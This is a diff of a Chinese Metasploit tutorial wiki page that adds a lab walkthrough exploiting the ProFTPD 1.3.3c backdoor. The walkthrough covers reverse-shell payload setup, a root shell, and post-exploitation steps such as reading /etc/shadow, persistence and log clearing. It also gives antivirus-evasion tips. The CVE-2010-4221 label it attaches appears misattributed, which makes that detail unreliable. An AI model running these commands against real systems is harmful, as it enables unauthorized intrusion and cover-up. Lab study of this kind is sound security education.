@@ -1,8 +1,9 @@
 ---
 title: Metasploit 渗透框架入门教程
 description: 系统梳理 Metasploit Framework 在 Windows 10 环境下的安装部署、PostgreSQL 数据库配置、msfvenom
-  木马生成与编码免杀、监听器配置及会话建立后的基础后渗透操作（摄像头控制、键鼠控制、日志清理等），适合渗透测试初学者快速上手。
-category: ai-security
+  木马生成与编码免杀、监听器配置及会话建立后的基础后渗透操作，并补充 ProFTPd 1.3.3c 后门漏洞利用实战案例，演示 search msf 模块、payload
+  选择、会话建立及后渗透提权全流程。
+category: program-analysis
 tags:
 - Metasploit
 - 渗透测试
@@ -12,15 +13,18 @@ tags:
 - Windows
 - 木马生成
 - 免杀
+- ProFTPd
+- CVE-2010-4221
+- 提权
 date: '2019-12-30'
-updated: '2026-11-13'
+updated: '2026-11-15'
 ---
 
 ## 概述
 
-Metasploit Framework（简称 MSF）是一个模块化的渗透测试框架，集成了数百个已知漏洞利用模块、载荷、编码器、辅助模块及后渗透功能，号称“渗透测试全家桶”。本文基于 0th3rs 安全团队微信归档文章，整理了在 **Windows 10** 环境下的完整安装配置流程、数据库对接、木马生成与监听、以及会话建立后的常用后渗透操作。
+Metasploit Framework（简称 MSF）是一个模块化的渗透测试框架，集成了数百个已知漏洞利用模块、载荷、编码器、辅助模块及后渗透功能，号称“渗透测试全家桶”。本文基于 0th3rs 安全团队微信归档文章，整理了在 **Windows 10** 环境下的完整安装配置流程、数据库对接、木马生成与监听、以及会话建立后的常用后渗透操作，并补充 **ProFTPd 1.3.3c 后门漏洞（CVE-2010-4221）实战复现** 全流程，演示从服务枚举、模块检索、载荷选择到会话建立与提权的完整攻击链。
 
-> 💡 相关扩展阅读：[[frp内网渗透应用]] 中演示了如何结合 frp SOCKS5 隧道代理本地 Metasploit 进行内网反弹 Shell。
+> 💡 相关扩展阅读：[[frp内网渗透应用]] 中演示了如何结合 frp SOCKS5 隧道代理本地 Metasploit 进行内网反弹 Shell；[[proftpd-133c-backdoor-exploitation]] 提供该漏洞的独立详细复现页，含 Exploit-DB 源码分析与 nmap/scripts 搜索细节。
 
 ---
 
@@ -191,6 +195,112 @@ meterpreter > run post/windows/gather/enum_applications  # 示例：枚举已安
 
 ---
 
+## 实战案例：ProFTPd 1.3.3c 后门漏洞利用复现（CVE-2010-4221）
+
+本节基于 0w1Club 归档文章《FTP服务后门漏洞利用》复现，演示在 **Kali Linux** 攻击机针对 **Ubuntu** 靶机的完整利用流程，覆盖 **服务枚举 → 漏洞检索 → MSF 模块搜索 → 载荷选择 → 会话建立 → TTY 优化 → 提权验证** 全链路。
+
+> 💡 同类漏洞复现参考：[[vulnhub-doubletrouble-writeup]]（Shellshock + Dirty COW 提权链）、[[vulnhub-admx-new-writeup]]（WordPress 插件上传 → MySQL UDF 提权）、[[internal-network-pivoting-techniques]]（Meterpreter 路由配合横向移动）。
+
+### 环境准备
+| 角色 | IP 地址 | 说明 |
+|------|---------|------|
+| 攻击机 | 172.20.236.105 | Kali Linux，已安装 Metasploit Framework |
+| 靶机   | 172.20.207.39  | Ubuntu，运行 ProFTPD 1.3.3c |
+
+### 服务枚举与版本识别
+使用 `nmap` 进行服务版本扫描，定位 FTP 服务版本：
+```bash
+nmap -sV 172.20.207.39
+```
+扫描结果显示：
+```
+21/tcp open  ftp     ProFTPD 1.3.3c
+```
+> 💡 交叉引用：[[network-fundamentals-penetration-testing]] 详解 nmap 服务版本探测原理与参数优化。
+
+### 漏洞情报检索
+利用 `searchsploit` 在本地 Exploit-DB 检索对应版本漏洞：
+```bash
+searchsploit ProFTPD 1.3.3c
+```
+输出示例：
+```
+linux/remote/15662.txt   # ProFTPD 1.3.3c - Backdoor Command Execution
+```
+查看漏洞详情：
+```bash
+gedit /usr/share/exploitdb/exploits/linux/remote/15662.txt
+```
+源码中硬编码回连 IP `212.26.42.47`，需修改后编译利用，**但 MSF 已集成该模块，直接使用更高效**。
+
+### MSF 模块搜索与加载
+启动 `msfconsole`，搜索对应模块：
+```bash
+msf6 > search ProFTPd 1.3.3c
+```
+匹配模块：
+```
+exploit/unix/ftp/proftpd_133c_backdoor
+```
+加载模块：
+```bash
+msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
+```
+
+### 载荷选择与配置
+查看可用载荷：
+```bash
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads
+```
+推荐使用 **命令反弹载荷**（无需上传二进制，适配 Linux 环境）：
+```bash
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
+```
+设置目标与回连参数：
+```bash
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 172.20.207.39
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RPORT 21
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 172.20.236.105
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LPORT 4444
+```
+
+### 发起攻击与会话建立
+```bash
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run
+```
+成功输出示例：
+```
+[*] Command shell session 1 opened (172.20.236.105:4444 -> 172.20.207.39:38214)
+```
+进入会话：
+```bash
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > sessions -i 1
+```
+
+### TTY 优化与交互增强
+原始 Shell 缺乏补全、历史记录、Ctrl+C 等交互能力，使用 Python 生成伪终端：
+```bash
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+> 💡 进阶 TTY 优化技巧（`script /dev/null`、`stty raw -echo`、`export TERM=xterm`）可参考 [[peda-buffer-overflow-analysis-guide]] 中的调试环境配置段落。
+
+### 权限验证与后渗透
+执行 `whoami`/`id` 确认权限：
+```bash
+root@ubuntu:/# whoami
+root
+```
+漏洞利用直接获得 **root 权限**，无需额外提权。后续可开展：
+- 敏感文件收集（`/etc/shadow`、SSH 密钥、Web 目录配置）
+- 持久化植入（SSH 公钥、定时任务、systemd 服务）
+- 内网横向移动（结合 [[internal-network-pivoting-techniques]] 中 Meterpreter `autoroute`/SOCKS 代理）
+- 日志清理（`/var/log/auth.log`、`/var/log/wtmp` 等）
+
+> 💡 实战中若仅获取低权限 Shell，可结合 [[linux-kernel-hardening-mechanisms]] 核对内核版本，搜索对应提权漏洞（如 Dirty COW CVE-2016-5195、CVE-2021-3493 等），参考 [[vulnhub-hard-socnet2-writeup]]、[[vulnhub-sar-writeup]] 实战提权链。
+
+---
+
 ## 常见问题与避坑指南
 
 | 现象 | 原因 | 解决方案 |
@@ -199,6 +309,8 @@ meterpreter > run post/windows/gather/enum_applications  # 示例：枚举已安
 | `db_connect` 失败 | PostgreSQL 服务未启动 / 端口冲突 | `services.msc` 启动 `postgresql-x64-<ver>`，检查 5432 端口 |
 | 生成的 `exe` 秒被删除 | 静态特征码命中 | 使用编码器、捆绑、自定义加载器、内存执行（如 `inject`、`execute -m`） |
 | Android 载荷无法回连 | 权限未授予 / 网络不通 | 目标需授予摄像头、联系人、存储权限；确保 LHOST 可达（公网 IP 或内网穿透） |
+| `search ProFTPd` 无结果 | 模块名称不精确 | 尝试 `search proftpd`、`search 133c`、`search backdoor` 组合关键词 |
+| `cmd/unix/reverse` 会话无交互 | 目标无 Python/Perl 等解释器 | 尝试 `cmd/unix/reverse_perl`、`cmd/unix/reverse_bash` 或上传静态编译的 `busybox`/`socat` |
 
 ---
 
@@ -209,20 +321,25 @@ meterpreter > run post/windows/gather/enum_applications  # 示例：枚举已安
 - [[docker-container-security-fundamentals]] — 容器环境下的渗透测试与防御视角
 - [[daily-security-digest-20191230]] — 同期每日安全看点，收录 Metasploit DoS 漏洞 (CVE-2019-5645) 等资讯
 - [[0th3rs-security-team-wechat-archive-201911-202204]] — 文章来源索引，可追溯更多团队历史技术分享
+- [[proftpd-133c-backdoor-exploitation]] — 该漏洞独立详细复现页，含 Exploit-DB 源码分析、nmap 脚本检测、手动编译利用对比
+- [[vulnhub-doubletrouble-writeup]] — Shellshock (CVE-2014-6271) + Dirty COW (CVE-2016-5195) 组合提权链
+- [[internal-network-pivoting-techniques]] — Meterpreter `autoroute`、`socks_proxy` 配合 Cobalt Strike/Venom/Frp 横向移动体系
+- [[peda-buffer-overflow-analysis-guide]] — Linux 下 PEDA 调试、ROP 链构造、TTY 优化技巧
+- [[linux-kernel-hardening-mechanisms]] — 内核缓解机制与提权漏洞适用性判断指南
 
 ---
 
 ## 小结
 
-Metasploit Framework 以模块化、自动化、生态完善著称，是渗透测试从业者的“瑞士军刀”。本文覆盖了 **安装 → 数据库 → 载荷生成 → 监听 → 后渗透** 的最小闭环，旨在帮助初学者快速跑通流程。**实战中务必遵守法律法规，仅在授权范围内开展测试**，切勿用于非法入侵。
+Metasploit Framework 以模块化、自动化、生态完善著称，是渗透测试从业者的“瑞士军刀”。本文覆盖了 **安装 → 数据库 → 载荷生成 → 监听 → 后渗透** 的基础闭环，并以 **ProFTPd 1.3.3c 后门（CVE-2010-4221）** 为实战案例，演示了 **nmap 枚举 → searchsploit 情报收集 → MSF 模块搜索 → cmd/unix/reverse 载荷选择 → 会话建立 → Python PTY 优化 → root 权限验证** 的完整攻击链。**实战中务必遵守法律法规，仅在授权范围内开展测试**，切勿用于非法入侵。
 
 > “工具无善恶，使用者有初心。” —— 0th3rs 安全团队
 
 ---
-*页面来源：0th3rs 安全团队微信公众号归档文章《【分享】Metasploit 渗透框架初探》（发布于 2019-12-30）*  
+*页面来源：0th3rs 安全团队微信公众号归档文章《【分享】Metasploit 渗透框架初探》（发布于 2019-12-30）与 0w1Club 归档文章《FTP服务后门漏洞利用》整合*  
 *整理日期：2025-08-24*  
 *维护者：数字知识库策展人*
 
 ## 来源
 
-- [0w1Club-201908-202207_20](../sources/0w1Club-201908-202207_20.md)
+- [0x00实验室-202108-202304_098](../sources/0x00实验室-202108-202304_098.md)
